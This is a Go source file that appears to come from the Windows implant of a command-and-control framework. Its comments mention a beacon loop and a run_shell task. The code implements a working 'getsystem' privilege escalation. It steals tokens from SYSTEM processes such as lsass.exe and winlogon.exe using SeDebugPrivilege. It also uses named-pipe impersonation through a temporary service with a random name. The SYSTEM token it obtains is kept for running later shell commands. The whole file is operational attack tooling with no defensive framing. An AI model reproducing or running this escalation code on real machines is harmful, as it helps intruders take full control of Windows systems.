//go:build windows

package agent

import (
	"fmt"
	"math/rand"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// gSystemToken holds the primary SYSTEM token obtained by GetSystem so that
// shell commands can use CreateProcessWithTokenW regardless of which goroutine
// (OS thread) executes them — thread impersonation is per-thread and would be
// lost as soon as the task goroutine switches threads.
var gSystemToken windows.Handle

var (
	procLookupPrivilegeValueW      = windows.NewLazySystemDLL("advapi32.dll").NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges      = windows.NewLazySystemDLL("advapi32.dll").NewProc("AdjustTokenPrivileges")
	procImpersonateNamedPipeClient = windows.NewLazySystemDLL("advapi32.dll").NewProc("ImpersonateNamedPipeClient")
	procOpenThreadToken            = windows.NewLazySystemDLL("advapi32.dll").NewProc("OpenThreadToken")
	procSetThreadToken             = windows.NewLazySystemDLL("advapi32.dll").NewProc("SetThreadToken")
)

// enablePrivilege enables a named privilege on the current process token.
func enablePrivilege(name string) error {
	var tok windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(),
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &tok); err != nil {
		return err
	}
	defer tok.Close()

	privName, _ := syscall.UTF16PtrFromString(name)
	var luid windows.LUID
	r, _, e := procLookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(privName)),
		uintptr(unsafe.Pointer(&luid)))
	if r == 0 {
		return fmt.Errorf("LookupPrivilegeValue(%s): %w", name, e)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	r, _, e = procAdjustTokenPrivileges.Call(
		uintptr(tok), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
	if r == 0 {
		return fmt.Errorf("AdjustTokenPrivileges: %w", e)
	}
	// AdjustTokenPrivileges returns TRUE even when not all privs were assigned;
	// ERROR_NOT_ALL_ASSIGNED (1300) means the privilege isn't in the token.
	if errno, ok := e.(syscall.Errno); ok && errno == 1300 {
		return fmt.Errorf("AdjustTokenPrivileges: privilege not held by this token")
	}
	return nil
}

// gsTokenOwner returns "DOMAIN\user" for the token, or "" on error.
func gsTokenOwner(tok windows.Token) string {
	info, err := tok.GetTokenUser()
	if err != nil {
		return ""
	}
	var nameBuf [256]uint16
	var domBuf [256]uint16
	nameLen := uint32(len(nameBuf))
	domLen := uint32(len(domBuf))
	var use uint32
	procLookupAccountSidW.Call(0,
		uintptr(unsafe.Pointer(info.User.Sid)),
		uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(unsafe.Pointer(&nameLen)),
		uintptr(unsafe.Pointer(&domBuf[0])), uintptr(unsafe.Pointer(&domLen)),
		uintptr(unsafe.Pointer(&use)))
	return windows.UTF16ToString(domBuf[:]) + `\` + windows.UTF16ToString(nameBuf[:])
}

// gsT1TokenSteal enables SeDebugPrivilege and steals a token from a SYSTEM process.
func gsT1TokenSteal() (windows.Token, string, error) {
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		return 0, "", fmt.Errorf("T1: enable SeDebug: %w", err)
	}

	targets := []string{"winlogon.exe", "lsass.exe", "services.exe", "wininit.exe"}

	pids := make([]uint32, 1024)
	var needed uint32
	procEnumProcesses.Call(
		uintptr(unsafe.Pointer(&pids[0])),
		uintptr(len(pids)*4),
		uintptr(unsafe.Pointer(&needed)))
	count := int(needed / 4)

	for _, target := range targets {
		for i := 0; i < count; i++ {
			pid := pids[i]
			if pid == 0 {
				continue
			}
			h, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
			if err != nil {
				continue
			}
			nameBuf := make([]uint16, 260)
			procGetProcessImageFileNameW.Call(
				uintptr(h), uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(len(nameBuf)))
			windows.CloseHandle(h)
			name := windows.UTF16ToString(nameBuf)
			if idx := strings.LastIndexAny(name, `\/`); idx >= 0 {
				name = name[idx+1:]
			}
			if !strings.EqualFold(name, target) {
				continue
			}
			tok, err := stealTokenFromPID(pid)
			if err != nil {
				continue
			}
			owner := gsTokenOwner(tok)
			r, _, e := procImpersonateLoggedOnUser.Call(uintptr(tok))
			if r == 0 {
				windows.CloseHandle(windows.Handle(tok))
				return 0, "", fmt.Errorf("T1: ImpersonateLoggedOnUser: %w", e)
			}
			return tok, fmt.Sprintf("T1 (SeDebug token steal from %s pid %d → %s)", target, pid, owner), nil
		}
	}
	return 0, "", fmt.Errorf("T1: no SYSTEM process accessible (SeDebug may be denied)")
}

// gsT2NamedPipeService creates a named pipe + service to get a SYSTEM token.
// Requires local admin to create a service via SCM.
// Uses overlapped ConnectNamedPipe with a 15-second timeout to avoid blocking
// the entire agent beacon loop (tasks run under wg.Wait in beacon.go).
func gsT2NamedPipeService() (windows.Token, string, error) {
	pipeName := fmt.Sprintf(`\\.\pipe\svc%08x`, rand.Uint32())
	pipeNameW, _ := syscall.UTF16PtrFromString(pipeName)

	const (
		PIPE_ACCESS_DUPLEX        = 0x00000003
		FILE_FLAG_OVERLAPPED      = 0x40000000
		PIPE_TYPE_BYTE            = 0x00000000
		PIPE_WAIT                 = 0x00000000
		NMPWAIT_USE_DEFAULT_WAIT  = 0x00000000
		SC_MANAGER_ALL_ACCESS     = 0xF003F
		SERVICE_WIN32_OWN_PROCESS = 0x00000010
		SERVICE_DEMAND_START      = 0x00000003
		SERVICE_ERROR_IGNORE      = 0x00000000
	)

	hPipe, _, e := procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(pipeNameW)),
		PIPE_ACCESS_DUPLEX|FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_BYTE|PIPE_WAIT,
		1, 512, 512,
		NMPWAIT_USE_DEFAULT_WAIT,
		0,
	)
	if hPipe == 0 || hPipe == ^uintptr(0) {
		return 0, "", fmt.Errorf("T2: CreateNamedPipe: %w", e)
	}
	defer windows.CloseHandle(windows.Handle(hPipe))

	hScm, _, e := procOpenSCManagerW.Call(0, 0, SC_MANAGER_ALL_ACCESS)
	if hScm == 0 {
		return 0, "", fmt.Errorf("T2: OpenSCManager: %w", e)
	}
	defer procCloseServiceHandleLat.Call(hScm)

	svcName := fmt.Sprintf("svc%08x", rand.Uint32())
	svcNameW, _ := syscall.UTF16PtrFromString(svcName)
	binPath := fmt.Sprintf(`cmd.exe /c echo . > %s`, pipeName)
	binPathW, _ := syscall.UTF16PtrFromString(binPath)

	hSvc, _, e := procCreateServiceW.Call(
		hScm,
		uintptr(unsafe.Pointer(svcNameW)),
		uintptr(unsafe.Pointer(svcNameW)),
		windows.SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_IGNORE,
		uintptr(unsafe.Pointer(binPathW)),
		0, 0, 0, 0, 0,
	)
	if hSvc == 0 {
		return 0, "", fmt.Errorf("T2: CreateService: %w", e)
	}
	defer func() {
		procDeleteServiceLat.Call(hSvc)
		procCloseServiceHandleLat.Call(hSvc)
	}()

	// Create a manual-reset event for the overlapped ConnectNamedPipe.
	hEvent, err := windows.CreateEvent(nil, 1, 0, nil)
	if err != nil {
		return 0, "", fmt.Errorf("T2: CreateEvent: %w", err)
	}
	defer windows.CloseHandle(hEvent)

	ov := windows.Overlapped{HEvent: hEvent}

	// Non-blocking ConnectNamedPipe before StartService so the pipe is
	// ready to accept the moment the service launches.
	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&ov)))
	procStartServiceW.Call(hSvc, 0, 0)

	// Fast path: most services connect within 2s.
	// Retry StartService once if slow, then wait up to 3s more (≤5s total).
	waitRes, _ := windows.WaitForSingleObject(hEvent, 2000)
	if waitRes != windows.WAIT_OBJECT_0 {
		procStartServiceW.Call(hSvc, 0, 0)
		waitRes, _ = windows.WaitForSingleObject(hEvent, 3000)
	}
	if waitRes != windows.WAIT_OBJECT_0 {
		procCancelIoEx.Call(hPipe, uintptr(unsafe.Pointer(&ov)))
		return 0, "", fmt.Errorf("T2: timeout waiting for pipe connection (res=%d)", waitRes)
	}

	r, _, e := procImpersonateNamedPipeClient.Call(hPipe)
	if r == 0 {
		return 0, "", fmt.Errorf("T2: ImpersonateNamedPipeClient: %w", e)
	}

	var tok windows.Token
	thread, _, _ := procGetCurrentThread.Call()
	r, _, e = procOpenThreadToken.Call(thread,
		uintptr(windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_IMPERSONATE|windows.TOKEN_ALL_ACCESS),
		0,
		uintptr(unsafe.Pointer(&tok)))
	if r == 0 {
		return 0, "", fmt.Errorf("T2: OpenThreadToken: %w", e)
	}

	owner := gsTokenOwner(tok)
	return tok, fmt.Sprintf("T2 (named pipe + service '%s' → %s)", svcName, owner), nil
}

// storePrimaryToken duplicates tok as a primary token and stores it in
// gSystemToken so run_shell can use CreateProcessWithTokenW on any thread.
func storePrimaryToken(tok windows.Token) {
	var hPrim windows.Token
	if err := windows.DuplicateTokenEx(tok, windows.TOKEN_ALL_ACCESS, nil,
		windows.SecurityImpersonation, windows.TokenPrimary, &hPrim); err == nil {
		old := gSystemToken
		gSystemToken = windows.Handle(hPrim)
		if old != 0 {
			windows.CloseHandle(old)
		}
	}
}

// GetSystem attempts privilege escalation to SYSTEM using multiple techniques.
// Returns descriptive output and whether SYSTEM was obtained.
func GetSystem() (string, bool) {
	var sb strings.Builder

	sb.WriteString("[*] T1: SeDebugPrivilege + token steal from SYSTEM process…\n")
	tok1, desc1, err1 := gsT1TokenSteal()
	if err1 == nil {
		storePrimaryToken(tok1)
		windows.CloseHandle(windows.Handle(tok1))
		sb.WriteString("[+] SYSTEM — " + desc1 + "\n")
		return sb.String(), true
	}
	sb.WriteString("    [-] " + err1.Error() + "\n")

	sb.WriteString("[*] T2: Named pipe impersonation via service creation…\n")
	tok2, desc2, err2 := gsT2NamedPipeService()
	if err2 == nil {
		storePrimaryToken(tok2)
		windows.CloseHandle(windows.Handle(tok2))
		sb.WriteString("[+] SYSTEM — " + desc2 + "\n")
		return sb.String(), true
	}
	sb.WriteString("    [-] " + err2.Error() + "\n")

	sb.WriteString("[!] getsystem failed — need SeDebugPrivilege or local admin (to create services)\n")
	return sb.String(), false
}
